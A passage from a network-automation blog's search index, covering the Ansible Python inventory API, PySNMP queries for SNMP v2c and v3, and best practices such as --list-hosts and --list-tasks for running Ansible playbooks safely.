vm.get_vars(host=host)\n...     print(host_vars)\n...\n{'syslog_servers': ['192.168.1.1', '192.168.1.2'], 'inventory_file': '/home/byaklin/ansible/inventory/hosts.yaml', 'inventory_dir': '/home/byaklin/ansible/inventory', 'ansible_host': '192.168.10.150', 'inventory_hostname': 'RouterA', 'inventory_hostname_short': 'RouterA', 'group_names': ['ios'], 'ansible_facts': {}, 'playbook_dir': '/home/byaklin/ansible/inventory', 'ansible_playbook_python': '/usr/bin/python3', 'ansible_config_file': None, 'groups': {'all': ['RouterA', 'SwitchA'], 'ungrouped': [], 'ios': ['RouterA'], 'nxos': ['SwitchA']}, 'omit': '__omit_place_holder__6c71c9ad93fbde3c2d7cd7336c994199d4a97678', 'ansible_version': 'Unknown'}\n{'syslog_servers': ['10.1.1.1', '10.1.1.2'], 'inventory_file': '/home/byaklin/ansible/inventory/hosts.yaml', 'inventory_dir': '/home/byaklin/ansible/inventory', 'ansible_host': '192.168.10.151', 'inventory_hostname': 'SwitchA', 'inventory_hostname_short': 'SwitchA', 'group_names': ['nxos'], 'ansible_facts': {}, 'playbook_dir': '/home/byaklin/ansible/inventory', 'ansible_playbook_python': '/usr/bin/python3', 'ansible_config_file': None, 'groups': {'all': ['RouterA', 'SwitchA'], 'ungrouped': [], 'ios': ['RouterA'], 'nxos': ['SwitchA']}, 'omit': '__omit_place_holder__6c71c9ad93fbde3c2d7cd7336c994199d4a97678', 'ansible_version': 'Unknown'}\n</code></pre> <p>In the above example you can see that by using the Ansible API, the VariableManager parses through the inventory file to identify which variables are used by which hosts. RouterA has syslog_servers 192.168.1.1 and 192.168.1.2, while SwitchA has syslg_servers 10.1.1.1 and 10.1.1.2. The order of precedence on how variables is identified by get_vars() can be seen in the docstring:</p> <pre><code>&gt;&gt;&gt; help(im.get_vars)\nget_vars(play=None, host=None, task=None, include_hostvars=True, include_delegate_to=True, use_cache=True, _hosts=None, _hosts_all=None, stage='task') method of ansible.vars.manager.VariableManager instance\n    Returns the variables, with optional \"context\" given via the parameters\n    for the play, host, and task (which could possibly result in different\n    sets of variables being returned due to the additional context).\n\n    The order of precedence is:\n    - play-&gt;roles-&gt;get_default_vars (if there is a play context)\n    - group_vars_files[host] (if there is a host context)\n    - host_vars_files[host] (if there is a host context)\n    - host-&gt;get_vars (if there is a host context)\n    - fact_cache[host] (if there is a host context)\n    - play vars (if there is a play context)\n    - play vars_files (if there's no host context, ignore\n      file names that cannot be templated)\n    - task-&gt;get_vars (if there is a task context)\n    - vars_cache[host] (if there is a host context)\n    - extra vars\n...\n</code></pre> <p>Finally, to iterate over a subset of hosts and obtain their variables, you can provide a pattern to get_hosts() as shown previously.</p> <pre><code>&gt;&gt;&gt; for host in im.get_hosts(pattern='ios'):\n...     host_vars = vm.get_vars(host=host)\n...     print(host_vars)\n...\n{'syslog_servers': ['192.168.1.1', '192.168.1.2'], 'inventory_file': '/home/byaklin/ansible/inventory/hosts.yaml', 'inventory_dir': '/home/byaklin/ansible/inventory', 'ansible_host': '192.168.10.150', 'inventory_hostname': 'RouterA', 'inventory_hostname_short': 'RouterA', 'group_names': ['ios'], 'ansible_facts': {}, 'playbook_dir': '/home/byaklin/ansible/inventory', 'ansible_playbook_python': '/usr/bin/python3', 'ansible_config_file': None, 'groups': {'all': ['RouterA', 'SwitchA'], 'ungrouped': [], 'ios': ['RouterA'], 'nxos': ['SwitchA']}, 'omit': '__omit_place_holder__6c71c9ad93fbde3c2d7cd7336c994199d4a97678', 'ansible_version': 'Unknown'}\n</code></pre>","tags":["Python","Automation","Ansible"]},{"location":"2021/08/05/using-ansible-inventory-files-in-python-scripts/#tldr","title":"TLDR","text":"<p>Using the Ansible Python API can be a helpful tool allowing you to use your Ansible inventory files in both Ansible playbooks and Python scripts (don't forget to read the Requirements and Caveats section above). It is quite easy to use and allows you to filter your inventory file on a subset of the hosts you may want to query with your Python scripts.</p>","tags":["Python","Automation","Ansible"]},{"location":"2021/08/25/simple-snmp-queries-with-python/","title":"Simple SNMP Queries with Python","text":"<p>The need to query network devices for information on a repeated and consistent basis always been a critical function of performing network management. Monitoring the health of your network devices, building reports for use by management, querying the status of a particular function, and so on. There are an increasing number of ways to perform this type of data gathering. From the extremes of manually logging in to run a CLI command or check a web GUI, to using the latest API or Netconf, network engineers have their choice of protocol to use. However, nothing is as common and widely deployed as Simple Network Management Protocol (SNMP). Most network monitoring platforms will rely on using SNMP, especially if a particular network platform is a decentralized platform like common routers and switches, requiring each network device to be queried individually instead of through a centralized controller.</p> <p>Note</p> <p>The historical pysnmp project, which has not been maintained due the the unfortunate passing of the maintainer, has since been forked and is being actively maintained (disclaimer, I have yet to test it yet). Most links in my SNMP posts to the PySNMP readthedocs should automatically redirect to the latest documentation, but the technical nature of my posts has not yet been updated. I hope to update these posts so that the community has a good resource to reference for the updated package.</p> <p>Note</p> <p>This article explains a simple method of querying devices without needing pre-complied MIB's, but this method isn't the standard way of using PySNMP. Refer to the following posts for more up-to-date articles on PySNMP: PySNMP's HLAPI for SNMP GET Requests, Compiling MIB's for PySNMP with PySMI, Bulk Data Gathering with PySNMP's nextCmd and bulkCMD.</p> <p>Because of SNMP's common use, this article covers how you can use PySNMP and Python to programmatically querying your network devices. This will not be an introduction to SNMP. If you're looking to brush up on your SNMP knowledge, PySNMP actually has an SNMP history and design page you may find useful.</p>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/25/simple-snmp-queries-with-python/#what-is-pysnmp","title":"What is PySNMP?","text":"<p>PySNMP is a Python package used for all manners of SNMP related functions. You can use the package to send SNMP GET or GETNEXT requests, send SNMP traps, or act as an SNMP agent which will respond to SNMP requests. I will be focusing on the GET and GETNEXT requests. PySNMP also supports all versions of SNMP, most of my examples below will be SNMP version 2c followed by a brief section covering how to use SNMP v3. There are a lot of features with this package, such as methods for performing asynchronous SNMP queries, but I will just be touching on the high-level API.</p> <p>In my research of finding SNMP packages for use with Python, PySNMP is by far the most complete and feature-rich package. In fact, Ansible's general community role still uses PySNMP for the snmp_facts module.</p> <p>Warning</p> <p>The code examples within this document hard code SNMP community values and SNMP v3 USM auth/priv information. DO NOT do this in production. Instead, use a secrets manager that you can programmatically query and/or environment variables. Always ensure that you are not hard coding secrets and commiting them to source control.</p>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/25/simple-snmp-queries-with-python/#getting-started-with-pysnmp","title":"Getting Started with PySNMP","text":"<p>In the examples I present in this post I have chosen to use the Ansible snmp_facts method of SNMP queries with PySNMP instead of the method presented in the PySNMP quick start documentation. I have found Ansible's method far easier to use for any queries to network devices for OID's not already in the standard MIB's that PySNMP can reference. PySNMP appears to be unable to take in standard MIB files and instead requires that they be converted to a specific PySNMP format using PySMI mibdump tool. I have found this tool difficult to use, so for simplicity I will use the Ansible method of performing SNMP queries which uses OID's directly.</p> <p>Note</p> <p>I've become more acquainted with PySMI's capabilities of compiling MIB's. Check out my latest post on how to use PySMI and mibdump.py to compile text MIB files into a format that PySNMP can read!</p> <p>Lets start with a simple example of using SNMP v2c to send a query to a network device for sysName.</p> <pre><code>import sys\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen\n\nSYSNAME = '1.3.6.1.2.1.1.5.0'\n\nhost = '10.1.1.1'\nsnmp_ro_comm = 'mysnmprocomm'\n\n# Define a PySNMP CommunityData object named auth, by providing the SNMP community string\nauth = cmdgen.CommunityData(snmp_ro_comm)\n\n# Define the CommandGenerator, which will be used to send SNMP queries\ncmdGen = cmdgen.CommandGenerator()\n\n# Query a network device using the getCmd() function, providing the auth object, a UDP transport\n# our OID for SYSNAME, and don't lookup the OID in PySNMP's MIB's\nerrorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(\n    auth,\n    cmdgen.UdpTransportTarget((host, 161)),\n    cmdgen.MibVariable(SYSNAME),\n    lookupMib=False,\n)\n\n# Check if there was an error querying the device\nif errorIndication:\n    sys.exit()\n\n# We only expect a single response from the host for sysName, but varBinds is an object\n# that we need to iterate over. It provides the OID and the value, both of which have a\n# prettyPrint() method so that you can get the actual string data\nfor oid, val in varBinds:\n    print(oid.prettyPrint(), val.prettyPrint())\n</code></pre> <p>To break down the above code a bit more, we query a host at IP address 10.1.1.1 with an SNMP v2c community string of mysnmprocomm for the sysName OID 1.3.6.1.2.1.1.5.0. This is performed by first importing PySNMP's oneliner cmdgen module which is a simplified method for performing SNMP queries versus the PySNMP high-level API (HLAPI). To use this module we first create a cmdgen CommandGenerator object which allows you to perform SNMP operations such as bulkCmd, getCmd, nextCmd and setCmd. In our example, we are using getCmd() which takes a few arguments:</p> <ul> <li>authData which we provide as an auth object created using cmdgen.CommunityData()</li> <li>A UDP transport which is where we provide the host IP address and common SNMP UDP port of 161</li> <li>A MIB variable which we have associated with our SYSNAME variables OID value</li> <li>An indication to not look the OID up in PySNMP's provided MIB references</li> </ul> <p>When issuing the getCmd() command it will return four variables</p> <ul> <li>errorIndication - A string that when present indicates an SNMP error, along with the provided text of the error</li> <li>errorStatus - A string that when present indicates an SNMP PDU error</li> <li>errorIndex - The index in varBinds that generated the error</li> <li>varBinds - A sequence of MIB variable values returned via SNMP. These are PySNMP ObjectType class instances</li> </ul> <p>To explore the errorIndication variable further, lets say that the host is not responding to SNMP. After calling the cmdgen.getCmd() function and getting the four returned values, a host thats non-responsive would look as follows (below):</p> <pre><code>&gt;&gt;&gt; errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(\n...     auth,\n...     cmdgen.UdpTransportTarget((host, 161)),\n...     cmdgen.MibVariable(SYSNAME),\n...     lookupMib=False,\n... )\n&gt;&gt;&gt; errorIndication\nRequestTimedOut('No SNMP response received before timeout')\n&gt;&gt;&gt; varBinds\n()\n</code></pre> <p>So errorIndication has an actual string value associated with it indicating that the request timed out, and varBinds is an empty Tuple. Lets look at what happens when the host is reachable and responds to sysName:</p> <pre><code>&gt;&gt;&gt; errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(\n...     auth,\n...     cmdgen.UdpTransportTarget((host, 161)),\n...     cmdgen.MibVariable(SYSNAME),\n...     lookupMib=False,\n... )\n&gt;&gt;&gt; len(varBinds)\n1\n&gt;&gt;&gt; varBinds\n[(&lt;ObjectName value object, tagSet &lt;TagSet object, tags 0:0:6&gt;, payload [1.3.6.1.2.1.1.5.0]&gt;, &lt;OctetString value object, tagSet &lt;TagSet object, tags 0:0:4&gt;, subtypeSpec &lt;ConstraintsIntersection object, consts &lt;ValueSizeConstraint object, consts 0, 65535&gt;&gt;, encoding iso-8859-1, payload [myrouter.yaklin.ca]&gt;)]\n&gt;&gt;&gt; for oid, val in varBinds:\n...     print(oid.prettyPrint(), val.prettyPrint())\n...\n1.3.6.1.2.1.1.5.0 myrouter.yaklin.ca\n</code></pre> <p>You can see that the actual varBinds Tuple contains a single entry witih multiple parameters. If we iterate over that entry we can get the OID which was returned, along with the value.</p> <p>Why would the returned OID be needed? Shouldn't we already know which OID we queried? You'll see that when querying using the nextCmd() method for a table of OID's, such as when querying the status of each interface on a device, you will need the returned OID as it will contain the high-level OID (e.g. 1.3.6.1.2.1.2.2.1.8 for ifOperStatus), concatenated with the ifIndex value for the interface</p>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/25/simple-snmp-queries-with-python/#querying-multiple-oids-at-once","title":"Querying Multiple OID's at Once","text":"<p>It turns out that you can actually provide multiple OID's to PySNMP's getCmd() method. If we wanted to query for both sysName and sysDescr, we could do so as follows (below I am only showing a subset of the code instead of repeating what was shown in the first example above):</p> <pre><code>SYSDESCR = '1.3.6.1.2.1.1.1.0'\nSYSNAME = '1.3.6.1.2.1.1.5.0'\n\n# Create a Tuple of the OID's that you want to query\noids = (SYSNAME, SYSDESCR)\n\nerrorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(\n    auth,\n    cmdgen.UdpTransportTarget((host, 161)),\n    *[cmdgen.MibVariable(oid) for oid in oids],\n    lookupMib=False,\n)\n</code></pre> <p>Now when we inspect varBinds we see we have two variable responses. One for sysName and the other for sysDescr:</p> <pre><code>&gt;&gt;&gt; len(varBinds)\n2\n&gt;&gt;&gt; for oid, val in varBinds:\n...     print(oid.prettyPrint(), val.prettyPrint())\n...\n1.3.6.1.2.1.1.5.0 myrouter.yaklin.ca\n1.3.6.1.2.1.1.1.0 0x436973636f20494f5320536f6674776172652c203238303020536f667477617265202843323830304e4d2d414456454e54455250524953454b392d4d292c2056657273696f6e2031322e3428313363292c2052454c4541534520534f4654574152452028666332290d0a546563686e6963616c20537570706f72743a20687474703a2f2f7777772e636973636f2e636f6d2f74656368737570706f72740d0a436f707972696768742028632920313938362d3230303720627920436973636f2053797374656d732c20496e632e0d0a436f6d70696c6564205468752031342d4a756e2d30372031383a35312062792070726f645f72656c5f7465616d\n</code></pre> <p>Note</p> <p>The sysDescr response is actually a hex representation that needs to be decoded. Using PySNMP's HLAPI will automatically decode this for us. However, if you wish to continue using cmdGen, decoding this is outside the scope of this post, but I would recommend reviewing the Ansible snmp_facts module and its decode_hex() and to_text() functions.</p>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/25/simple-snmp-queries-with-python/#querying-an-snmp-table-using-nextcmd","title":"Querying an SNMP table using nextCmd()","text":"<p>To query an SNMP table for details you need to use the nextCmd() function. This is very similar to the getCmd() function, with only some minor adjustments. SNMP tables are used for data such as interface details (admin or operational up/down status, duplex, speed, etc) and metrics (bytes in/out, errors, discards, etc), the physical inventory of a device (such as entPhysicalModelName for querying Cisco's EoX API - Check out my posts on the API's in part 1 and part 2).</p> <p>Below I present a complete code snippet highlighting its use. I have adjusted the comments specific to the changes from the previous snippet.</p> <pre><code>import sys\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen\n\nIFOPERSTATUS = '1.3.6.1.2.1.2.2.1.8'\n\nhost = '10.1.1.1'\nsnmp_ro_comm = 'mysnmprocomm'\n\nauth = cmdgen.CommunityData(snmp_ro_comm)\ncmdGen = cmdgen.CommandGenerator()\n\n# Query a network device using the nextCmd() function. We're providing the ifOperStatus\n# OID and expect an SNMP table response, which we will call varTable\nerrorIndication, errorStatus, errorIndex, varTable = cmdGen.nextCmd(\n    auth,\n    cmdgen.UdpTransportTarget((host, 161)),\n    cmdgen.MibVariable(IFOPERSTATUS),\n    lookupMib=False,\n)\n\nif errorIndication:\n    sys.exit()\n\n# We can now iterate over each interface to get its operational status\nfor varBinds in varTable:\n    for oid, val in varBinds:\n        print(oid.prettyPrint(), 'Operational Status', val.prettyPrint())\n</code></pre> <p>When using nextCmd() it will return a table of varBinds, so we need to iterate first over the table and then over the varBinds. The results of this query to my test router show four interfaces with their operational status. The values for ifOperStatus are numeric values representing the operational status where a response value of 1 means the interface is operationally up and 2 means it is down.</p> <pre><code>&gt;&gt;&gt; for varBinds in varTable:\n...     for oid, val in varBinds:\n...         print(oid.prettyPrint(), 'Operational Status', val.prettyPrint())\n...\n1.3.6.1.2.1.2.2.1.8.1 Operational Status 2\n1.3.6.1.2.1.2.2.1.8.2 Operational Status 1\n1.3.6.1.2.1.2.2.1.8.3 Operational Status 2\n1.3.6.1.2.1.2.2.1.8.5 Operational Status 1\n</code></pre> <p>You'll also see in the above output that although we queries for the OID of 1.3.6.1.2.1.2.2.1.8, we now see each response OID has the ifIndex value (1, 2, 3, and 5 in the above example) appended to the end. This can allow you to query for ifName and ifDescr so that you can provide more human readable details around which interfaces are up and down.</p>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/25/simple-snmp-queries-with-python/#querying-using-snmp-v3","title":"Querying using SNMP v3","text":"<p>Many SNMP deployements that I come across are still using SNMP v1 or v2c versions which are insecure as the queries and responses are not encrypted. If you're fortunate enough to work in an SNMP v3 environment, you need to adjust how you create the auth credentials provided to getCmd() and nextCmd(). If you're still using SNMP v1 or v2c, there's never a better time than now to advocate for SNMP v3, or another method of obtaining telemetry through a protocol that uses strong authentication and encryption.</p> <p>There are multiple parameters that need to be provided to create an SNMP v3 auth credential to provide to getCmd() and nextCmd(). The following shows a common example using SHA512 and AES256 with SNMP v3, and how to create the auth object for further use by these functions:</p> <pre><code>import sys\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen\n\nSYSNAME = '1.3.6.1.2.1.1.5.0'\n\nhost = '10.1.1.1'\n\n# Define a PySNMP UsmUserData object named auth, by providing the SNMP v3 username,\n# auth key and protocol, and priv key and protocol\nauth = cmdgen.UsmUserData(userName='mysnmpuser',\n                          authKey='myauthpassphrase',\n                          authProtocol=cmdgen.usmHMAC384SHA512AuthProtocol,\n                          privKey='myprivpassphrase',\n                          privProtocol=cmdgen.usmAesCfb256Protocol)\n\ncmdGen = cmdgen.CommandGenerator()\nerrorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(\n    auth,\n    cmdgen.UdpTransportTarget((host, 161)),\n    cmdgen.MibVariable(SYSNAME),\n    lookupMib=False,\n)\n\nif errorIndication:\n    sys.exit()\n\nfor oid, val in varBinds:\n    print(oid.prettyPrint(), val.prettyPrint())\n</code></pre> <p>PySNMP has classes that you can use for the auth and priv protocols in use by SNMP v3. The following are their class names:</p> <ul> <li>Auth Protocol Classes</li> <li>cmdgen.usmHMACMD5AuthProtocol</li> <li>cmdgen.usmHMACSHAAuthProtocol</li> <li>cmdgen.usmHMAC128SHA224AuthProtocol</li> <li>cmdgen.usmHMAC192SHA256AuthProtocol</li> <li>cmdgen.usmHMAC256SHA384AuthProtocol</li> <li>cmdgen.usmHMAC384SHA512AuthProtocol</li> <li>cmdgen.usmNoAuthProtocol (the default, if authProtocol is not provided)</li> <li>Priv Protocol Classes</li> <li>cmdgen.usmDESPrivProtocol</li> <li>cmdgen.usm3DESEDEPrivProtocol</li> <li>cmdgen.usmAesCfb128Protocol</li> <li>cmdgen.usmAesCfb192Protocol</li> <li>cmdgen.usmAesCfb256Protocol</li> <li>cmdgen.usmNoPrivProtocol (the default, if no privProtocol is provided)</li> </ul>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/25/simple-snmp-queries-with-python/#wrapping-up","title":"Wrapping Up","text":"<p>Using SNMP within Python doesn't have to be hard, and it offers an easier approach to obtaining device details and metrics without having to scrape CLI output with regular expressions. The data that you obtain can be used for all sorts of things including monitoring, reporting and troubleshooting. I have previously presented using the Cisco EoX Support API to query Cisco's site for end-of-life information, but I didn't provide a method to gather the list of product ID's programmatically from your network inventory. SNMP would be a great tool to get this information by querying entPhysicalModelName to get your list of product ID's. I'm hoping to write a post specifically about this in the near future!</p>","tags":["Python","Automation","SNMP"]},{"location":"2021/08/27/a-practical-guide-to-deploying-saml-for-anyconnect-external/","title":"A Practical Guide to Deploying SAML for AnyConnect (External)","text":"<p>The pandemic has rapidly advanced the need for high-quality and secure remote access VPN solutions (RAVPN). As a result, many RAVPN solutions provided by vendors have been targetted by hackers. This has resulted in newly identified vulnerabilities and security advisories being released by the vendors. One area of concern is around user credential management and multi-factor authentication (MFA). The configuration examples, provided by Cisco and authentication providers, for configuring SAML and Cisco AnyConnect fail to highlight how to configure multiple group-policies so that you can restrict access appropriately for each business unit and vendor. Instead, they highlight have to apply a single group-policy to cover all of your remote access users. I've written a blog post for my employer Optanix that provides a production-grade example of how to deploy SAML for Cisco AnyConnect, using multiple group-policies and LDAP attribute maps for fine-grained access control.</p> <p>Read A Practical Guide to Deploying SAML for AnyConnect for more details and let me know what you think!</p>","tags":["Security","Cisco","SAML"]},{"location":"2021/09/09/best-practices-for-safe-ansible-playbook-execution/","title":"Best Practices for Safe Ansible Playbook Execution","text":"<p>Ansible can be a very powerful automation tool, allowing you to interact with hundreds or thousands of network devices at once. The automation is defined through a combination of inventory files, variable files, and playbooks (with optional task files and roles). The combination of these features makes a very powerful automation tool, but with that comes a high-level of risk. In this guide I highlight a few best practices to follow when executing Ansible playbooks. By following these best practices you will have increased confidence that you are implementing the correct tasks against the correct set of devices, and avoid any surprises!</p> <p>The ansible-playbook best practices covered in this post are:</p> <ol> <li>Manually specifying your inventory file</li> <li>Using the list-hosts flag to confirm the hosts are as you expect</li> <li>Using the list-tasks flag to confirm the tasks that will be implemented</li> </ol>","tags":["Automation","Ansible"]},{"location":"2021/09/09/best-practices-for-safe-ansible-playbook-execution/#example-ansible-inventory-and-playbook","title":"Example Ansible Inventory and Playbook","text":"<p>In this post I will be using the following Ansible file structure:</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ tree\n.\n\u251c\u2500\u2500 ansible.cfg\n\u251c\u2500\u2500 group_vars\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ios.yml\n\u251c\u2500\u2500 inventory\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 hosts.yml\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ios_routers.yml\n\u2514\u2500\u2500 test-pb.yml\n\n2 directories, 5 files\n</code></pre> <p>The inventory file that we will be using is ios_routers.yml:</p> <pre><code>---\nios:\n  hosts:\n    RouterA:\n      ansible_host: 192.168.10.150\n      syslog_servers:\n        - 192.168.1.1\n        - 192.168.1.2\n    RouterB:\n      ansible_host: 192.168.10.151\n  children:\n    calgary:\n      hosts:\n        RouterA:\n    ottawa:\n      hosts:\n        RouterB:\n</code></pre> <p>Finally, the example playbook that I have is as shown below. The specific details about what each task does is not important, what is important is that we have multiple tasks, some of which are related. This will become more apparent in my explanation of the list-tasks flag later on.</p> <pre><code>---\n- hosts: ios\n  gather_facts: False\n\n  tasks:\n    - name: Configure banner\n      tags:\n        - banner\n      cisco.ios.ios_banner:\n        banner: login\n        text: \"{{ banners.login }}\"\n        state: present\n\n    - name: Remove MOTD banner\n      tags:\n        - banner\n      cisco.ios.ios_banner:\n        banner: motd\n        text: \"{{ banners.motd }}\"\n        state: present\n\n    - name: Remove EXEC banner\n      tags:\n        - banner\n      cisco.ios.ios_banner:\n        banner: exec\n        state: absent\n\n    - name: Remove incoming banner\n      tags:\n        - banner\n      cisco.ios.ios_banner:\n        banner: incoming\n        state: absent\n\n    - name: Confure logging hosts\n      tags:\n        - logging\n      ios_logging:\n        dest: host\n        name: \"{{ item }}\"\n        state: present\n      loop: \"{{ syslog_servers }}\"\n\n    - name: Adjust local logging buffer\n      tags:\n        - logging\n      ios_logging:\n        dest: buffered\n        size: 5000\n        level: informational\n        state: present\n\n    - name: Configure SNMP\n      tags:\n        - snmp\n      ios_config:\n        lines:\n          - snmp-server location {{ snmp.location }}\n          - snmp-server contact {{ snmp.contact }}\n          - snmp-server community {{ snmp.community }} ro SNMP_ACL\n      no_log: True\n\n    - name: Configure SNMP ACL\n      tags:\n        - snmp\n      ios_config:\n        lines:\n          - permit {{ item }}\n        parents:\n          - ip access-list standard SNMP_ACL\n      loop: \"{{ snmp.servers }}\"\n\n    - name: Configure Local Accounts\n      tags:\n        - users\n      ios_config:\n        lines:\n          - username {{ item.username }} secret {{ item.password }}\n      loop: \"{{ users }}\"\n      no_log: True\n\n    - name: Save configuration\n      tags:\n        - save\n      ios_config:\n        save_when: modified\n</code></pre>","tags":["Automation","Ansible"]},{"location":"2021/09/09/best-practices-for-safe-ansible-playbook-execution/#best-practice-1-manually-specifying-inventory-file","title":"Best Practice # 1 - Manually specifying inventory file","text":"<p>There are multiple ways for the ansible-playbook command to find an inventory file to execute against. This can be through the use of the ANSIBLE_INVENTORY variable, the default location of inventory/hosts.yml, by using the -i flag on the ansible-playbook command, dynamic inventory scripts, etc. With many different methods of defining your inventory, I find the safest method is to manually and explicitly identify it when executing a playbook. This ensures that if you created an inventory file for a specific change you are implementing, there is no chance of ansible-playbook picking up a different inventory file through one of the other methods. This will help you avoid uninentional changes being executed against devices unrelated to your change.</p> <p>In my example folder structure there are two inventory files, but the one that I want to execute my playbook against is ios_routers.yml. To specify this I use the -i flag with the ansible-playbook command:</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ls inventory/\nhosts.yml  ios_routers.yml\nbyaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml -i inventory/ios_routers.yml\n</code></pre> <p>In the words of The Zen of Python, Explicit is better than implicit.</p>","tags":["Automation","Ansible"]},{"location":"2021/09/09/best-practices-for-safe-ansible-playbook-execution/#best-practice-2-using-the-ansible-playbook-list-hosts-flag","title":"Best Practice # 2 - Using the ansible-playbook list-hosts flag","text":"<p>In addition to manually specifying the inventory file you want to execute your playbook against, there are often times where you may wish to only run the playbook against a subset of hosts in that inventory. Perhaps you have one master inventory file and you execute your playbooks against a particular group, or a host pattern. To confirm that you are running your playbook against the specific intended hosts, you can use the --list-hosts flag to confirm before execution that Ansible has found the correct hosts.</p> <p>You get extra bonus points if your organization has a well defined host naming convention for your network devices. Naming conventions are super helpful in conveying context, such as location or function, and can help in allowing you to use simple pattern matching with your Ansible playbooks.</p> <p>When using the --list-hosts flag your playbook will not actually be executed. This gives you an opportunity to examine the returned hosts to confirm they are correct, before executing your playbook against them (by removing the --list-hosts flag):</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml --list-hosts\n\nplaybook: test-pb.yml\n\n  play #1 (ios): ios    TAGS: []\n    pattern: ['ios']\n    hosts (1):\n      RouterA\n</code></pre> <p>In the above command I forgot to specify my inventory file with the -i flag. However, by using the --list-hosts flag it allowed me to spot that I was missing RouterB in the hosts that would be included as part of Play #1. I now realize my mistake, specify the host file manually and re-run my check with the --list-hosts flag to confirm that both RouterA and RouterB are now identified:</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml -i inventory/ios_routers.yml --list-hosts\n\nplaybook: test-pb.yml\n\n  play #1 (ios): ios    TAGS: []\n    pattern: ['ios']\n    hosts (2):\n      RouterB\n      RouterA\n</code></pre> <p>Finally, as one last example, if I only wanted to execute a playbook against a subset of my inventory by using a pattern, I can use the --list-hosts flag to ensure that my pattern is correct. In this case I only want to execute the playbook against the RouterB host.</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml -i inventory/ios_routers.yml --limit RouterB --list-hosts\n\nplaybook: test-pb.yml\n\n  play #1 (ios): ios    TAGS: []\n    pattern: ['ios']\n    hosts (1):\n      RouterB\n</code></pre>","tags":["Automation","Ansible"]},{"location":"2021/09/09/best-practices-for-safe-ansible-playbook-execution/#best-practice-3-using-the-ansible-playbook-list-tasks-flag","title":"Best Practice # 3 - Using the ansible-playbook --list-tasks flag","text":"<p>It is possible to have dozens of tasks (or more!) included in a playbook, and these can be included through separate task files, roles, etc. Depending on the purpose of your playbook and the automation that you might want to execute you may only want to implement a subset of the tasks. The ansible-playbook --list-tasks flag allows you to see which tasks will be executed. Like the --list-hosts flag previously covered, the --list-tasks flag will not actually execute your playbook. It allows you to see what will be executed, confirm it is as expected, and then you remove the flag and implement your changes.</p> <p>To start, lets run the --list-tasks flag against our test-pb.yml. You can see below that we have 10 tasks, some of which are related (see the TAGS values).</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml --list-tasks\n\nplaybook: test-pb.yml\n\n  play #1 (ios): ios    TAGS: []\n    tasks:\n      Configure banner  TAGS: [banner]\n      Remove MOTD banner    TAGS: [banner]\n      Remove EXEC banner    TAGS: [banner]\n      Remove incoming banner    TAGS: [banner]\n      Confure logging hosts TAGS: [logging]\n      Adjust local logging buffer   TAGS: [logging]\n      Configure SNMP    TAGS: [snmp]\n      Configure SNMP ACL    TAGS: [snmp]\n      Configure Local Accounts  TAGS: [users]\n      Save configuration    TAGS: [save]\n</code></pre> <p>Note</p> <p>Providing meaningful names to your tasks is very important. It helps you and anyone else using your playbook know what each task is going to do without having to read through the playbook task by task. It also helps everyone use the --list-tasks flag effectively</p> <p>As an example, perhaps your organization just updated its device banner standards and only wants to run those tasks. Although Ansible tasks and modules are intended to be idempotent (only making changes when necessary and if needed), which means you could run all tasks and only the changes that are necessary (the banner) would be executed, it could drastically extend the amount of time the playbook tasks to execute. This is because Ansible needs to validate if each task needs to be executed, before actually implementing it. Instead, if you know that you only want to update the banner, you can use the -t flag to specify the banner tag I have associated with each of those tasks. But how do you know that you didn't make a mistake when creating or specifying that tag? By using the --list-tasks flag:</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml -t banner,save --list-tasks\n\nplaybook: test-pb.yml\n\n  play #1 (ios): ios    TAGS: []\n    tasks:\n      Configure banner  TAGS: [banner]\n      Remove MOTD banner    TAGS: [banner]\n      Remove EXEC banner    TAGS: [banner]\n      Remove incoming banner    TAGS: [banner]\n      Save configuration    TAGS: [save]\n</code></pre> <p>Now we can see that only the tasks specific to updating the banner will be executed.</p> <p>Note</p> <p>I also have a specific task for saving the configuration (using the save tag). This helps ensure that if changes are made that they will be saved to the startup-configuration. Not all Ansible Cisco modules will do this by default (or even have the option), so instead of writing the save_when option on each of my tasks, I include it at the end of my playbook.</p>","tags":["Automation","Ansible"]},{"location":"2021/09/09/best-practices-for-safe-ansible-playbook-execution/#tying-it-all-together","title":"Tying it all together","text":"<p>It turns out that you can use both the --list-hosts and --list-tasks flags at the same time. This allows you to validate that both the inventory and the expected tasks are correct, before you implement. The below output shows you both the hosts that were identified (in my case RouterB) and the specific tasks (banner updates, and saving the configuration):</p> <pre><code>byaklin@ansiblevm:~/ansible-example$ ansible-playbook test-pb.yml -i inventory/ios_routers.yml --limit RouterB -t banner,save --list-tasks --list-hosts\n\nplaybook: test-pb.yml\n\n  play #1 (ios): ios    TAGS: []\n    pattern: ['ios']\n    hosts (1):\n      RouterB\n    tasks:\n      Configure banner  TAGS: [banner]\n      Remove MOTD banner    TAGS: [banner]\n      Remove EXEC banner    TAGS: [banner]\n      Remove incoming banner    TAGS: [banner]\n      Save configuration    TAGS: [save]\n</code></pre> <p>Whenever I go to implement an automation using Ansible, before executing the playbook I use these options to validate that everything is as I expect it to be. I also log this information to a file and save it as part of my pre-change information gathering attached to a change record. This is to 